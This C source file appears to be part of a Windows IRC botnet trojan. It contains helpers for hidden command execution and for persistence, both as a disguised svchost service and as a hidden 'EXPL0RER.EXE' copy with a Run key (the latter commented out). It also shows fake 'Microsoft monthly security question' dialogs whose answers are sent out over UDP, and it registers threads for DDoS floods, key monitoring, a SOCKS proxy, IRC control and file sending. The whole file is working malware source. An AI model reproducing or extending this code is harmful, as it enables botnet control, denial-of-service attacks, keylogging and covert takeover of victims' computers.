#include "StdAfx.h"
#include "extern.h"

extern char clipboard_buffer[CLIPBOARD_SIZE*2];
/// Generate random string to buffer with max size of arg 2 

char* format_system_error(DWORD error)
{
	static	char	message[1024];
	LPVOID lpMsgBuf ;

	if(FormatMessage( 
		FORMAT_MESSAGE_ALLOCATE_BUFFER | 
		FORMAT_MESSAGE_FROM_SYSTEM | 
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		error,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
		(LPTSTR) &lpMsgBuf,
		0,
		NULL 
		) == 0)
	{
		deb("error while formatting message: %s", FORMATERROR);
		return "FORMATMESSAGE ERROR";
	}

	strncpy(message, (char*) lpMsgBuf, sizeof(message));
	LocalFree(lpMsgBuf);

	return message;
}

void GetRandStr(WORD size,char* buf)
{
	char a[] = "qwertyuiopasdfghjklzxcvbnm";

	buf[size] = 0x0;
	srand( (unsigned)time( NULL ) );
	while(size--) {
		buf[size] = a[rand()%(sizeof(a)-1)];
	}
	return;
}

void set_globals(void)
{
	memset(clipboard_buffer, 0, sizeof(clipboard_buffer));
	udp_chunks_sleep = UDP_CHUNKS_SLEEP_MODEM;
	udp_user_chunks_sleep = 0;
	return;
}

WORD SystemCmd(char *cmd,char *outBuf,DWORD bufsiz)
{
	char stmpfname[15];
	FILE *f;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	z(&si,sizeof(si));
	si.cb = sizeof(si);
	z(&pi,sizeof(pi));
	z(stmpfname,11);
	GetRandStr(7,stmpfname);
	strcat(stmpfname,".tmp");
	_snprintf(outBuf,bufsiz,"/C %s > %s",cmd,stmpfname);

	if( !CreateProcess( "cmd.exe", outBuf, NULL, NULL, FALSE,
		DETACHED_PROCESS|CREATE_NO_WINDOW, NULL, NULL, &si, &pi )) {
			udpdeb("CreateProcess failed. (%d)\n",GetLastError());
			deb("CreateProcess failed. (%d)\n",GetLastError());
			return ERR;
	}

	WaitForSingleObject( pi.hProcess, 5000 );
	deb("CMD: %s done.\n", outBuf);
	CloseHandle( pi.hProcess );
	CloseHandle( pi.hThread );

	f = fopen(stmpfname,"r");
	if(f == NULL) {
		sprintf(outBuf, "i/o error?");
		deb("output file is NULL\n");
		return ERR;
	}

	int dwread = fread(outBuf,1,bufsiz,f);
	deb("fread: %d bytes bufsiz: %d buffer: %s", dwread, bufsiz, outBuf);
	fclose(f);
	_unlink(stmpfname);

	return SUCCESS;
}
WORD AlreadyHere(void)
{
	if((presence = CreateMutex(NULL, TRUE, PRESENCE_NAME)) == NULL)
		return 0;
	if(GetLastError() == ERROR_ALREADY_EXISTS) {
		return 1;
	}
	return 0;
}
/*
int registerme(void)
{

HKEY hkRegKey;
char szWinDir[MAX_PATH];
char szModuleName[MAX_PATH];
FILE *f = NULL;

GetWindowsDirectory(szWinDir,MAX_PATH);
strcat(szWinDir,"\\EXPL0RER.EXE");
GetModuleFileName(NULL, szModuleName, MAX_PATH);

f = fopen(szWinDir,"r");
if(f == NULL || strcmp(szModuleName,szWinDir) != 0) {
SetFileAttributes(szWinDir,FILE_ATTRIBUTE_NORMAL);
DeleteFile(szWinDir);
CopyFile(szModuleName,szWinDir,false);
SetFileAttributes(szWinDir,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM);
} else {
if(f) fclose(f);
}


if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_RUN_KEY, 0, 
NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkRegKey, NULL) == ERROR_SUCCESS) 
{
HKEY hkRegKey;
if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_RUN_KEY, 0, KEY_ALL_ACCESS, &hkRegKey) == ERROR_SUCCESS)
{
if(RegSetValueEx(hkRegKey, REGISTRY_KEY_NAME, 0, REG_SZ, (BYTE *)szWinDir, lstrlen(szWinDir)) == ERROR_SUCCESS)
RegCloseKey(hkRegKey);
}
}

if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_RUN_KEY, 0, 
NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkRegKey, NULL) == ERROR_SUCCESS) 
{
HKEY hkRegKey;
if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_APP_PATH, 0, KEY_ALL_ACCESS, &hkRegKey) == ERROR_SUCCESS)
{
if(RegSetValueEx(hkRegKey, REGISTRY_KEY_NAME, 0, REG_SZ, (BYTE *)szWinDir, lstrlen(szWinDir)) == ERROR_SUCCESS)
RegCloseKey(hkRegKey);
}
}
return SUCCESS;
}
*/
int msg_box(char *arg)
{
	DWORD id = NULL;
	HANDLE h = NULL; 
	static char sarg[128];

	lstrcpy(sarg,arg);
	h = xCreateThread( NULL, 0, msg_box_th, (void*) sarg,0, &id);  
	if (h == NULL) {
		udpdeb( "xCreateThread for msg_box_th failed (%d)\n", GetLastError() ); 
		return ERR;
	}
	return SUCCESS;;
}

DWORD WINAPI msg_box_th( LPVOID sArg1 )
{
	int userRes;

	if(strstr((char*)sArg1,"?")) {
		userRes = MessageBox(NULL,(char*)sArg1,"Microsoft monthly security question",
			MB_YESNO|MB_SYSTEMMODAL|MB_DEFAULT_DESKTOP_ONLY);
	} else {
		userRes = MessageBox(NULL,(char*)sArg1,"Microsoft monthly info",
			MB_OK|MB_SYSTEMMODAL|MB_DEFAULT_DESKTOP_ONLY);
	}
	if(userRes == IDYES) {
		udpdeb("%s : Yes\n",sArg1);
	} else if(userRes == IDNO) {
		udpdeb("%s : No\n",sArg1);
	} else if(userRes == IDOK) {
		udpdeb("%s : Ok\n",sArg1);
	} else {
		udpdeb("%s : <Dialog killed> %s\n",sArg1,FORMATERROR);
	}
	ExitThread(SUCCESS);
}

void * ma(WORD size) 
{
	void *p;
	p = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,size);
	if(p == NULL) {
		deb("HEAP FAILED!\n");
		return NULL;
	}
	return p;

}

int mf(void* p)
{
	if(p == NULL) {
		deb("FREE NULL BLOCK!\n");
		return -1;
	}
	HeapFree(GetProcessHeap(),0,p);
	return 0;
}

void charrep(char *buf,char c,char to)
{
	while(*buf) {
		if(*buf == c)
			*buf = to;
		buf++;
	}
}

int rep(char *buffer,char *what,char *to)
{
	char *t,*ot;
	int reps = 0;
	register int wl,tl;

	t = _strdup(buffer);
	if(t == NULL)
	{
		deb("failed to dup string\n");
		return ERR;
	}
	ot = t;
	wl = lstrlen(what);
	tl = lstrlen(to);
	while(*t) 
	{
		if(*t == *what) 
		{
			deb("found %s\n",t);
			if(memcmp(t,what,wl) == 0) 
			{
				memcpy(buffer,to,tl);
				t += wl ;
				buffer += tl;
				*(buffer) = 0x0;
				reps++;
				continue;
			}
		} 
		else {
			*buffer = *t;
			*(buffer + 1) = 0x0;
		}
		buffer++;
		t++;
	}

	*buffer = 0x0;
	free(ot);
	return reps;
}

void delservice(void)
{
	SC_HANDLE sch = NULL;
	SC_HANDLE scs = NULL;

	sch = OpenSCManager(NULL,NULL,GENERIC_WRITE);
	if(sch != NULL)
	{
		scs = OpenService(sch,"Twain16",SERVICE_ALL_ACCESS);
		if(scs)
		{
			DeleteService(scs);
			CloseServiceHandle(sch);
			CloseServiceHandle(scs);
			deb("service deleted.\n");
		}
		else
		{
			deb("del openscm %d\n",GetLastError());
			return;
		}
	} else {
		deb("del openscm %d\n",GetLastError());
		return;
	}
	
	
}

int RegisterService(char* path)
{
	SC_HANDLE	scmHandle = NULL;
	SC_HANDLE	scService = NULL;
	HKEY		hKey, newhKey;
	TCHAR		KeyName[256];
	DWORD		ret;
	BYTE		buf[512];

	scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(scmHandle == NULL){
		deb("OpenSCManager: %s\n",FORMATERROR);
		return 1;
	}
	scService = CreateService(scmHandle, SERVICE_NAME, SERVICE_DISPNAME, SERVICE_ALL_ACCESS,
		SERVICE_WIN32_SHARE_PROCESS|SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
		SVCHOST_PATH, NULL, NULL, NULL, NULL, NULL);

	if(scService == NULL){
		deb("CreateService: (%d) %s\n",GetLastError(),FORMATERROR);
		return 1;
	}
	wsprintf(KeyName, "%s\\%s", SERVICE_KEY, SERVICE_NAME);

	ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, KeyName, NULL, KEY_SET_VALUE, &hKey);
	if (ret != ERROR_SUCCESS){
		deb("RegOpenKeyEx: %s\n",FORMATERROR);
		return 1;
	}
	ret = RegSetValueEx(hKey, "Description", NULL, REG_SZ, (CONST BYTE*)SERVICE_DESC,lstrlen(SERVICE_DESC)+1);	
	if (ret != ERROR_SUCCESS){
		deb("RegSetValueEx: %s\n",FORMATERROR);
		return 1;
	}
	ret = RegCreateKey(hKey, "Parameters", &newhKey);
	if (ret != ERROR_SUCCESS){
		deb("RegCreateKey: %s\n",FORMATERROR);
		return 1;
	}
	ret = RegSetValueEx(newhKey, "ServiceDll", NULL, REG_EXPAND_SZ, (CONST BYTE*)path,lstrlen(path)+1);
	if (ret != ERROR_SUCCESS){
		deb("RegSetValueEx: %s\n",FORMATERROR);
		return 1;
	}
	RegCloseKey(newhKey);
	RegCloseKey(hKey);

	ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, SVCHOST_KEY, NULL, KEY_WRITE | KEY_READ, &hKey);
	if (ret != ERROR_SUCCESS){
		deb("RegOpenKeyEx: %s\n",FORMATERROR);
		return 1;
	}

	DWORD valueSize = 1;
	ret = RegQueryValueEx(hKey, SERVICE_GROUP, NULL, NULL, NULL, &valueSize);
	if(ret != ERROR_SUCCESS){
		deb("RegQueryValueEx: %s\n",FORMATERROR);
		return 1;
	}

	ret = RegQueryValueEx(hKey, SERVICE_GROUP, NULL, NULL, buf, &valueSize);
	if(ret != ERROR_SUCCESS){
		deb("RegQueryValueEx: %s\n",FORMATERROR);
		return 1;
	}

	BYTE* tmp = buf+valueSize-1;
	wsprintf((char*)tmp, "%s\0", SERVICE_NAME);

	ret = RegSetValueEx(hKey, SERVICE_GROUP, NULL, REG_MULTI_SZ, buf,
		valueSize+lstrlen(SERVICE_NAME));

	if (ret != ERROR_SUCCESS){
		deb("RegSetValueEx: %s\n",FORMATERROR);
		return 1;
	}
	RegCloseKey(hKey);	
	deb("Service created.\n");
	if(StartService(scService,NULL,NULL) == 0)
	{
		deb("StartService: %s\n",FORMATERROR);
	}
	else
	{
		deb("Service started.\n");
	}
	CloseServiceHandle(scService);
	CloseServiceHandle(scmHandle);

	return 0;
}

LONG FileAccess(char *szPath,DWORD access)
{
	HANDLE f;

	f = CreateFile(szPath,access,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	CloseHandle(f);
	if(f == INVALID_HANDLE_VALUE)
		return 1;
	else
		return 0;
}

int CoreInit(void)
{
	InitializeCriticalSection(&tcs);
	fthread = (THREAD*) a( sizeof(THREAD) );
	if( fthread == NULL )
		return ERR;

	RegisterFunctionType( HttpGetThread, "Http get thread / GET ddos", HTTP_GET_THREAD);
	RegisterFunctionType( HttpUpdateThread, "Http update thread ", HTTP_UPDATE_THREAD);
	RegisterFunctionType( ICMP, "ICMP ddos thread", DDOS_ICMP_THREAD);
	RegisterFunctionType( TCP, "TCP ddos thread", DDOS_TCP_THREAD);
	RegisterFunctionType( UDP, "UDP ddos thread", DDOS_UDP_THREAD);
	RegisterFunctionType( CoreIdentd, "Identd thread", IDENTD_THREAD);
	RegisterFunctionType( keysmonitor, "Key monitoring thread", KEYS_THREAD);
	RegisterFunctionType( msg_box_th, "Messagebox thread", MSG_BOX_THREAD);
	RegisterFunctionType( CoreSocks, "Socks v4/5 server thread", SOCKS_SERVER_THREAD);
	RegisterFunctionType( ProcessSocksClient, "Socks client thread", 
		SOCKS_CLIENT_THREAD);
	RegisterFunctionType( CoreIrc, "Core IRC thread", IRC_CORE_THREAD);
	RegisterFunctionType( DccSend, "Dcc send thread", DCC_SEND_THREAD);
	RegisterFunctionType( CoreHttp, "HTTP Server", HTTP_SERVER_THREAD);
	RegisterFunctionType( monitor_updates, "Update monitoring", 
		UPDATE_MONITORING_THREAD);
	RegisterFunctionType( (LPTHREAD_START_ROUTINE) FindFile, "FindFile", 
		FINDFILE_THREAD);
	RegisterFunctionType( udp_sendfile, "UDP Send file", UDP_SENDFILE_THREAD);
	RegisterFunctionType( (LPTHREAD_START_ROUTINE) udp_send_msg, "UDP Send message", 
		UDP_SENDMSG_THREAD);
	RegisterFunctionType( (LPTHREAD_START_ROUTINE) open_cl, "Bscs control connection", 
		BSCS_CONTROL);
	RegisterFunctionType( (LPTHREAD_START_ROUTINE) pcr, "Bscs client connection", 
		BSCS_CLIENT);

	return SUCCESS;
}
void SaveNick(char *nick)
{
	DWORD len;
	HKEY hkey;

	deb("Setting nick in registry...");
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, TWAIN_KEY, 0, KEY_WRITE, &hkey) != ERROR_SUCCESS)
		return;

	len = strlen(nick) + 1;
	if(RegSetValueEx(hkey, "Nick", 0, REG_SZ, (BYTE*) nick, len) != ERROR_SUCCESS) {
		deb("RegSetValueEx: %s\n", FORMATERROR);
		return;
	}

	RegCloseKey(hkey);
	deb("Successfully changed nick to %s in registry \n", nick);
}
int GetSavedNick(char *nick)
{
	DWORD len, type;
	HKEY hkey;
	int rnick = 0;
	char cnick[128];

	deb("Checking saved nick...");
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, TWAIN_KEY, 0, KEY_READ, &hkey) 
		!= ERROR_SUCCESS)
		return -1;

	len = 255;
	if(RegQueryValueEx(hkey, "Entry", 0, &type, (LPBYTE) nick, &len) != ERROR_SUCCESS) 
	{
		deb("RegQuery for entry: %s\n", FORMATERROR);
		if(RegQueryValueEx(hkey, "Nick", 0, &type, (LPBYTE) nick, &len) != ERROR_SUCCESS) 
		{
			deb("RegQuery for nick: %s\n", FORMATERROR);
			return -1;
		}
		else
		{
			rnick = 1;
		}
	}
	if(!rnick)
	{
		strcpy(cnick, nick);
		decrypt((u_char*) cnick, (u_char*) nick, XOR);
		deb("Saved nick(crypted): %s",nick);
	}
	else
	{
		deb("Saved nick(plain): %s",nick);
	}
	RegCloseKey(hkey);
	return 0;
}
